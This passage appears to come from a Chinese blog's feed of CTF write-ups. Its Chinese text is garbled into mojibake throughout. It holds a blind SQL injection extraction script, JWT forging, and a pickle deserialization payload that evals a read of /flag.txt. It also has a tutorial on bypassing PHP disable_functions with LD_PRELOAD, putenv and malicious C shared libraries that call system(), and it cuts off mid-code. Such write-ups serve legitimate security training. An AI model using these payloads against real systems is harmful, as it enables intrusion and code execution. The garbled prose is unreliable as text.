&quot;?stunum=0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)&quot;%(i,mid)    # çˆ†ç ´è¡¨å        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)&quot;%(i,mid)    # çˆ†ç ´å­—æ®µ        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    # çˆ†ç ´æ•°æ®        payload = &quot;?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        time.sleep(0.2)        if &quot;Hi admin, your score is: 100&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145433880.png" alt="image-20211022145433880"></p><p>å†™è¿™ä¸ªè„šæœ¬èŠ±äº†æŒºé•¿æ—¶é—´ï¼ŒåŸå› æ˜¯å¯¹sqlæ³¨å…¥è¯­å¥è¿˜ä¸ç†Ÿç»ƒï¼Œå®¹æ˜“è¢«æ‹¬å·è¿·æƒ‘ï¼Œçœ‹æ™•ã€‚</p><p>ä»¥åè¦æ³¨é‡å†™ä»£ç çš„èƒ½åŠ›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 ååŒ—èµ›åŒº Day1 Web2 ikun_0x10-0x1F</title>
      <link href="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/"/>
      <url>/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/</url>
      
        <content type="html"><![CDATA[<p>ä¸€æ‰“å¼€é¡µé¢ï¼Œå¾ˆé­”æ€§ã€‚ã€‚</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.png" alt="image-20211020233731895"></p><p>å…ˆæ³¨å†Œä¸ªè´¦å·</p><p>ä¸‹é¢æç¤ºä¸€å®šè¦ä¹°åˆ°lv6</p><p>ç¿»äº†å¥½å‡ é¢ï¼Œæ²¡æœ‰æ‰¾åˆ°ï¼Œäºæ˜¯å†™äº†ä¸€ä¸ªç®€å•çš„çˆ¬è™«è„šæœ¬ï¼šS</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234222133.png" alt="image-20211020234222133"></p><p>æ³¨æ„çˆ¬è™«è¦æ…¢ä¸€ç‚¹ï¼Œbuuå¾ˆå®¹æ˜“å´©ã€‚</p><pre><code class="python">import urllib.requestimport timefor i in range(0,1000):    url = &#39;http://272059db-2e14-4adc-ae85-8f5a64a35acb.node4.buuoj.cn:81/shop?page=&#39;+str(i)    print(url)    time.sleep(1)    response = urllib.request.urlopen(url).read().decode(&#39;utf-8&#39;)    if &#39;lv6.png&#39; in response:        print(i)        break</code></pre><p>å‘ç°åœ¨181é¢</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234439410.png" alt="image-20211020234439410"></p><p>ä¸è¿‡é’±å´ä¸å¤ªå¤Ÿï¼Œç”¨burpæŠ“ä¸‹åŒ…è¯•ä¸€è¯•</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234524015.png" alt="image-20211020234524015"></p><p>å‘ç°discount=0.8ï¼Œå°†å®ƒæ”¹å°</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234610565.png" alt="image-20211020234610565"></p><p>å‘ç°åªå…è®¸adminç™»å½•</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234638452.png" alt="image-20211020234638452"></p><p>ä»”ç»†åˆ†æä¸‹æ•°æ®åŒ…ï¼Œå‘ç°äº†jwtï¼Œè§£ä¸€ä¸‹ç ï¼š</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235006767.png" alt="image-20211020235006767"></p><p>çˆ†ç ´ä¸€ä¸‹ï¼ˆæ„Ÿè§‰è¿™ä¸ªæŒºé è¿æ°”å’Œå­—å…¸å§ï¼‰</p><p>å‘ç°å¯†é’¥ä¸º 1Kun</p><p>é‡æ–°ç”Ÿæˆadminçš„jwt</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235300543.png" alt="image-20211020235300543"></p><p>æŸ¥çœ‹æºä»£ç :</p><p>åœ¨è¿™é‡Œå‘ç°æºç æ³„éœ²ï¼š</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235354388.png" alt="image-20211020235354388"></p><p>ä¸‹è½½ä¸‹æ¥ï¼Œæ‰¾åˆ°ä¸€ä¸ªå«admin.pyçš„æ–‡ä»¶ï¼Œæ‰“å¼€</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235429287.png" alt="image-20211020235429287"></p><p>çœ‹åˆ°äº†pickleï¼ŒæŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼š</p><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªå­—å…¸ï¼Œä½ æƒ³å­˜å‚¨å®ƒï¼Œç¨åå†å–å‡ºæ¥ã€‚ä½ å¯ä»¥æŠŠå®ƒçš„å†…å®¹å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå°å¿ƒç¿¼ç¿¼åœ°ç¡®ä¿ä½¿ç”¨äº†æ­£ç¡®åœ°æ ¼å¼ï¼Œè¦æŠŠå®ƒè¯»å–å‡ºæ¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ exec() æˆ–å¤„ç†æ–‡ä»¶è¾“å…¥ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•å¹¶ä¸å¯é ï¼šå¦‚æœä½ ä½¿ç”¨çº¯æ–‡æœ¬æ¥å­˜å‚¨é‡è¦æ•°æ®ï¼Œæ•°æ®å¾ˆå®¹æ˜“ä»¥å¤šç§æ–¹å¼è¢«ç ´åæˆ–è€…ä¿®æ”¹ï¼Œå¯¼è‡´ä½ çš„ç¨‹åºå´©æºƒï¼Œæ›´ç³Ÿç³•çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯èƒ½åœ¨ä½ çš„è®¡ç®—æœºä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¦pickleå®ƒ:</p><pre><code>import pickledata = &#123;&#39;foo&#39;: [1,2,3],                &#39;bar&#39;: (&#39;Hello&#39;, &#39;world!&#39;),                &#39;baz&#39;: True&#125;jar = open(&#39;data.pkl&#39;, &#39;wb&#39;)pickle.dump(data, jar) # å°†pickleåçš„æ•°æ®å†™å…¥jaræ–‡ä»¶jar.close()</code></pre><p>è¿‡äº†å‡ ä¸ªå°æ—¶ï¼Œæˆ‘ä»¬æƒ³æŠŠå®ƒå–å‡ºæ¥ï¼Œæˆ‘ä»¬åªéœ€è¦åpickleå®ƒ:</p><pre><code>import picklepkl_file = open(&#39;data.pkl&#39;, &#39;rb&#39;) # ä¸pickleåçš„æ•°æ®è¿æ¥data = pickle.load(pkl_file) # æŠŠå®ƒåŠ è½½è¿›ä¸€ä¸ªå˜é‡print datapkl_file.close()</code></pre><p>å°†ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæ­£å¦‚ä½ æœŸå¾…çš„ï¼Œå®ƒå°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ data ã€‚</p><p>ç°åœ¨ï¼Œè¿˜éœ€è¦è°¨æ…åœ°è¯´ä¸€å¥ï¼š  pickleå¹¶ä¸å®Œç¾ã€‚Pickleæ–‡ä»¶å¾ˆå®¹æ˜“å› ä¸ºäº‹æ•…æˆ–è¢«æ•…æ„çš„ç ´åæ‰ã€‚Picklingæˆ–è®¸æ¯”çº¯æ–‡æœ¬æ–‡ä»¶å®‰å…¨ä¸€äº›ï¼Œä½†æ˜¯ä¾ç„¶æœ‰å¯èƒ½è¢«ç”¨æ¥è¿è¡Œæ¶æ„ä»£ç ã€‚è€Œä¸”å®ƒè¿˜ä¸æ”¯æŒè·¨Pythonç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¸è¦æŒ‡æœ›åˆ†å‘pickleå¯¹è±¡ä¹‹åæ‰€æœ‰äººéƒ½èƒ½æ­£ç¡®åœ°è¯»å–ã€‚ç„¶è€Œä¸ç®¡æ€ä¹ˆæ ·ï¼Œå®ƒä¾ç„¶æ˜¯ä¸€ä¸ªå¼ºæœ‰åŠ›çš„å·¥å…·ï¼Œå¯ä»¥ç”¨äºç¼“å­˜å’Œå…¶ä»–ç±»å‹çš„æŒä¹…åŒ–å·¥ä½œã€‚</p><h3 id="11-13-2-Pickleä½ çš„å¯¹è±¡"><a href="#11-13-2-Pickleä½ çš„å¯¹è±¡" class="headerlink" title="11.13.2. Pickleä½ çš„å¯¹è±¡"></a><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id53">11.13.2. Pickleä½ çš„å¯¹è±¡</a></h3><p>Pickleä¸ä»…ä»…å¯ä»¥ç”¨äºå†…å»ºç±»å‹ï¼Œä»»ä½•éµå®ˆpickleåè®®çš„ç±»éƒ½å¯ä»¥è¢«pickleã€‚Pickleåè®®æœ‰å››ä¸ªå¯é€‰æ–¹æ³•ï¼Œå¯ä»¥è®©ç±»è‡ªå®šä¹‰å®ƒä»¬çš„è¡Œä¸ºï¼ˆè¿™å’ŒCè¯­è¨€æ‰©å±•ç•¥æœ‰ä¸åŒï¼Œé‚£ä¸åœ¨æˆ‘ä»¬çš„è®¨è®ºèŒƒå›´ä¹‹å†…ï¼‰ã€‚</p><ul><li> <strong>getinitargs</strong>(self)</li></ul><p>  å¦‚æœä½ æƒ³è®©ä½ çš„ç±»åœ¨åpickleæ—¶è°ƒç”¨ <strong>init</strong> ï¼Œä½ å¯ä»¥å®šä¹‰__getinitargs__(self) ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªå‚æ•°å…ƒç»„ï¼Œè¿™ä¸ªå…ƒç»„ä¼šä¼ é€’ç»™__init__ ã€‚æ³¨æ„ï¼Œè¿™ä¸ªæ–¹æ³•åªèƒ½ç”¨äºæ—§å¼ç±»ã€‚</p><ul><li> <strong>getnewargs</strong>(self)</li></ul><p>  å¯¹æ–°å¼ç±»æ¥è¯´ï¼Œä½ å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ”¹å˜ç±»åœ¨åpickleæ—¶ä¼ é€’ç»™ <strong>new</strong> çš„å‚æ•°ã€‚è¿™ä¸ªæ–¹æ³•åº”è¯¥è¿”å›ä¸€ä¸ªå‚æ•°å…ƒç»„ã€‚</p><ul><li> <strong>getstate</strong>(self)</li></ul><p>  ä½ å¯ä»¥è‡ªå®šä¹‰å¯¹è±¡è¢«pickleæ—¶è¢«å­˜å‚¨çš„çŠ¶æ€ï¼Œè€Œä¸ä½¿ç”¨å¯¹è±¡çš„ <strong>dict</strong> å±æ€§ã€‚ è¿™ä¸ªçŠ¶æ€åœ¨å¯¹è±¡è¢«åpickleæ—¶ä¼šè¢« <strong>setstate</strong> ä½¿ç”¨ã€‚</p><ul><li> <strong>setstate</strong>(self)</li></ul><p>  å½“ä¸€ä¸ªå¯¹è±¡è¢«åpickleæ—¶ï¼Œå¦‚æœå®šä¹‰äº† <strong>setstate</strong> ï¼Œå¯¹è±¡çš„çŠ¶æ€ä¼šä¼ é€’ç»™è¿™ä¸ªé­”æ³•æ–¹æ³•ï¼Œè€Œä¸æ˜¯ç›´æ¥åº”ç”¨åˆ°å¯¹è±¡çš„ <strong>dict</strong> å±æ€§ã€‚è¿™ä¸ªé­”æ³•æ–¹æ³•å’Œ__getstate__ ç›¸äº’ä¾å­˜ï¼šå½“è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½è¢«å®šä¹‰æ—¶ï¼Œä½ å¯ä»¥åœ¨Pickleæ—¶ä½¿ç”¨ä»»ä½•æ–¹æ³•ä¿å­˜å¯¹è±¡çš„ä»»ä½•çŠ¶æ€ã€‚</p><ul><li> <strong>reduce</strong>(self)</li></ul><p>  å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ <strong>reduce</strong> è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ <strong>setstate</strong> çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›</p><ul><li> <strong>reduce_ex</strong>(self)</li></ul><p>  <strong>reduce_ex</strong> çš„å­˜åœ¨æ˜¯ä¸ºäº†å…¼å®¹æ€§ã€‚å¦‚æœå®ƒè¢«å®šä¹‰ï¼Œåœ¨pickleæ—¶__reduce_ex__ ä¼šä»£æ›¿ <strong>reduce</strong> è¢«è°ƒç”¨ã€‚ <strong>reduce</strong> ä¹Ÿå¯ä»¥è¢«å®šä¹‰ï¼Œç”¨äºä¸æ”¯æŒ <strong>reduce_ex</strong> çš„æ—§ç‰ˆpickleçš„APIè°ƒç”¨ã€‚</p><p>è¿™é‡Œæ„é€ payload,ä¼ ç»™becomeï¼š</p><pre><code>import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235644482.png" alt="image-20211020235644482"></p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235657704.png" alt="image-20211020235657704"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡LD_PRELOADä¸putenvç»„åˆæ‹³ç»•è¿‡disable_functionså‡½æ•°</title>
      <link href="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/"/>
      <url>/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨åœºæ™¯ï¼š</p><p>å½“æ‹¿åˆ°äº†ä¸€ä¸ªç½‘ç«™shellï¼Œä½†å‘½ä»¤åŸºæœ¬éƒ½æ— æ³•ä½¿ç”¨æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½æ˜¯disable_functionså¯¼è‡´çš„ã€‚</p><p>æ— å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½çš„ webshell æ˜¯æ— æ„ä¹‰çš„ï¼Œå¾—çªç ´ï¼</p><p>é¦–å…ˆæ¥ä»‹ç»ä¸‹æˆ‘ä»¬éœ€è¦ä½¿ç”¨çš„ä¸¤ä¸ªå‡½æ•°ï¼š</p><p>LD_PRELOAD:</p><p>googleç»™å‡ºå¦‚ä¸‹å®šä¹‰ï¼š</p><pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>å³LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨ã€‚</p><p>PUTENVå‡½æ•°ï¼šå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡</p><pre><code class="php">putenv ( string $setting ) : bool</code></pre><p>æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚</p><p>ä¸€èˆ¬è€Œè¨€ï¼Œåˆ©ç”¨æ¼æ´æ§åˆ¶ web å¯åŠ¨æ–°è¿›ç¨‹ a.binï¼Œa.bin å†…éƒ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•° b()ï¼Œb()  ä½äºç³»ç»Ÿå…±äº«å¯¹è±¡ c.so  ä¸­ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸ºè¯¥è¿›ç¨‹åŠ è½½å…± c.soï¼Œæƒ³æ³•åœ¨ c.so å‰ä¼˜å…ˆåŠ è½½å¯æ§çš„ c_evil.soï¼Œc_evil.so  å†…å«ä¸ b()  åŒåçš„æ¶æ„å‡½æ•°ï¼Œç”±äº c_evil.so ä¼˜å…ˆçº§è¾ƒé«˜ï¼Œæ‰€ä»¥ï¼Œa.bin å°†è°ƒç”¨åˆ° c_evil.so å†… b() è€Œéç³»ç»Ÿçš„  c.so å†…  b()ï¼ŒåŒæ—¶ï¼Œc_evil.so å¯æ§ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚</p><h2 id="ä¼ ç»Ÿæ–¹å¼-hijacking-function"><a href="#ä¼ ç»Ÿæ–¹å¼-hijacking-function" class="headerlink" title="ä¼ ç»Ÿæ–¹å¼(hijacking function)"></a>ä¼ ç»Ÿæ–¹å¼(hijacking function)</h2><p>åœ¨å·²æœ‰çš„æ–‡ç« ä¸­æ˜¾ç¤ºï¼Œä¸€èˆ¬ä½¿ç”¨php<code>mail()</code>å‡½æ•°è¿›è¡Œè§¦å‘ï¼Œæˆ‘ä»¬ç®€å•åˆ†æä¸€ä¸‹</p><p>è¿™é‡Œç®€å•å†™ä¸ªdemo</p><pre><code class="php">&lt;?phpmail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p>æˆ‘ä»¬straceä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿è¡Œè¿™ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œç¨‹åºä¼šå¯å­è¿›ç¨‹æ¥è°ƒç”¨sendmail</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦çœ‹ä¸€ä¸‹sendmailä½¿ç”¨äº†å“ªäº›å‡½æ•°</p><p><a href="https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01c76b4a9b6bc50197.png" alt="img"></a></p><p>æœ‰å¾ˆå¤šå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©geteuid()ï¼Œç„¶åæˆ‘ä»¬ç¼–å†™è‡ªå·±çš„evil shared librariesï¼šhack.c</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;        system(&quot;ls / &gt; /tmp/sky&quot;);&#125;int geteuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;</code></pre><p>ç„¶åç¼–è¯‘ä¸€ä¸‹</p><pre><code>gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so</code></pre><p>ç„¶åæˆ‘ä»¬è¿è¡Œè„šæœ¬</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./hack.so&quot;);mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p><a href="https://p0.ssl.qhimg.com/t01afcea293e08668c6.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01afcea293e08668c6.png" alt="img"></a></p><p>ä¸éš¾å‘ç°å®ƒæ‰§è¡Œäº†å‘½ä»¤ï¼Œç„¶åå¯ä»¥å‘ç°/tmpç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªæ–‡ä»¶sky</p><pre><code>root@sky:~# ls /tmp | grep skysky</code></pre><p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹</p><pre><code>root@sky:~# cat /tmp/skybinbootdevetchomeliblib32....</code></pre><p>å‘ç°æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p>ä½†æ˜¯è¿™æ˜¯åŸºäºå­˜åœ¨sendmail()è¿™ä¸ªå¸¸ç”¨å‡½æ•°çš„åŸºç¡€ä¸Šï¼Œå¦‚æœç›®æ ‡çš„sendmail()å‡½æ•°ä¹Ÿè¢«ç¦ç”¨äº†é‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>ä¸‹é¢æ¥ä»‹ç»æ”¹è¿›ç‰ˆçš„ï¼š</p><h2 id="æ”¹è¿›ç‰ˆ-hijack-shared-library"><a href="#æ”¹è¿›ç‰ˆ-hijack-shared-library" class="headerlink" title="æ”¹è¿›ç‰ˆ(hijack shared library)"></a>æ”¹è¿›ç‰ˆ(hijack shared library)</h2><p>å·²ç»æ²¡æœ‰äº†sendmailï¼Œä½†æˆ‘ä»¬ä¾æ—§å¯ä»¥è¿›è¡Œrceï¼Œå¯ä½¿ç”¨å¦‚ä¸‹æ–‡ä»¶sky.c</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>å…¶ä¸­<code>__attribute__ ((__constructor__))</code>æœ‰å¦‚ä¸‹è¯´æ˜</p><pre><code>1.It&#39;s run when a shared library is loaded, typically during program startup.2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.3.The destructor is run when the shared library is unloaded, typically at program exit.</code></pre><p>æ‰€ä»¥å½“æˆ‘ä»¬æœ€å¼€å§‹å°†evil shared library loadä¸Šåï¼Œå°±ä¼šè§¦å‘<code>__attribute__ ((__constructor__))</code>ï¼Œä»è€Œè¾¾æˆæˆ‘ä»¬rceçš„ç›®çš„.</p><p>å¸¸è€ƒå¯Ÿçš„è¿˜æœ‰php-imagick</p><p>æˆ‘ä»¬å‘ç°å¦‚ä¸‹å¯¹åº”å…³ç³»</p><p><a href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t018ee5e5eadefc3997.png" alt="img"></a></p><p>æˆ‘ä»¬å‘ç°å½“æ–‡ä»¶æ˜¯MPEG formatæ—¶ï¼Œç¨‹åºä¼šè°ƒç”¨â€™ffmpegâ€™ programè¿›è¡Œè½¬æ¢ï¼Œè€Œå¦‚ä¸‹åç¼€éƒ½è¢«è®¤ä¸ºæˆMPEG format</p><p><a href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01b63cd8517778cd0f.png" alt="img"></a></p><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹.wmv</p><p>å†™å‡ºè„šæœ¬</p><pre><code class="php">&lt;?php$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0</code></pre><p>å¯ä»¥å‘ç°çš„ç¡®æˆåŠŸå¯åŠ¨äº†å­è¿›ç¨‹ï¼Œè°ƒç”¨äº†ffmpeg</p><p>ä½†æ˜¯å¦‚æœsky.wmvæ–‡ä»¶ä¸å­˜åœ¨æ—¶</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</code></pre><p>åˆ™ä¸ä¼šè°ƒç”¨ffmpeg</p><p>æ‰€ä»¥ä¹Ÿä¸éš¾åˆ†æå‡ºï¼Œåº”è¯¥æ˜¯æœ‰ä¸€æ­¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨çš„æ“ä½œï¼Œå†ä¼šå»è¿›è¡Œè°ƒç”¨ç›¸å…³ç¨‹åºè¿›è¡Œè§£ç è½¬æ¢çš„æ“ä½œ</p><p>æ‰€ä»¥å¦‚æœæƒ³åˆ©ç”¨Imagickæ–°èµ·å­è¿›ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—å…ˆæœ‰åé¢çš„å‚æ•°æ–‡ä»¶ï¼Œå½“ç„¶è¿™å¹¶ä¸æ˜¯ä»€ä¹ˆéš¾äº‹ã€‚</p><p> payload &amp; attack</p><p>é‚£ä¹ˆåªå‰©æœ€åçš„æ”»å‡»äº†ï¼Œæ‰¾åˆ°äº†å¯ä»¥èµ·å­è¿›ç¨‹çš„æ–¹å¼ï¼Œåªå·®æ„é€ evil shared libraryäº†</p><p>æˆ‘ä»¬è¿˜æ˜¯ç”¨ä¹‹å‰çš„sky.c</p><pre><code class="c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    